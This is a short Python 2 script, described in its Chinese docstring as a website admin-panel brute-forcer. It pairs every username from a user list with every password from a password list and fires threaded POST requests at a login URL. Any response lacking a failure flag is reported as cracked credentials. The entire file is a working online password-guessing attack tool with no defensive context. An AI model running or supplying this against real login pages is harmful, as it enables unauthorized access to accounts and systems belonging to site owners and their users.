import sys, requests,Queue
from threading import Thread
from time import *
'''
网站后台爆破
'''


q=Queue.Queue()

def usage():
    print "[usage]python brute.py url userparam passparam flag"
def loaddict():
    buffer1 = []
    buffer2 = []
    buffer3 = []

    f = open('user.txt', 'r')
    for i in f.readlines():
        buffer1.append(i.strip('\n'))
    f.close()

    f = open('pass.txt', 'r')
    for i in f.readlines():
        buffer2.append(i.strip('\n'))
    f.close()

    for i in buffer1:
        for j in buffer2:
            buffer3.append([i, j])
    return buffer3

def intoqueue():
    dict=loaddict()
    for i in dict:
        q.put(i)

def crack(url, userparam, passparam, flag,txt):
    #txt = q.get(block=False)
    #print txt
    usr = txt[0]
    pwd = txt[1]
    payload = {userparam: usr, passparam: pwd}
    #print payload
    r = requests.post(url=url, data=payload)
    #print payload
    #print r.content
    if flag not in r.content:
        print '[success]username:%s,password:%s' % (usr, pwd)
    #print "Not success!"


if __name__ == '__main__':
    try:
        nowtime=time()
        intoqueue()
        url = sys.argv[1]
        userparam = sys.argv[2]
        passparam = sys.argv[3]
        flag = sys.argv[4]
        while 1:
            if q.empty():
                break
            txt = q.get()
            #print txt
            t=Thread(target=crack,args=(url, userparam, passparam, flag,txt))
            t.start()
        endtime=time()-nowtime
        print 'now time is :',endtime
    except:
        usage()



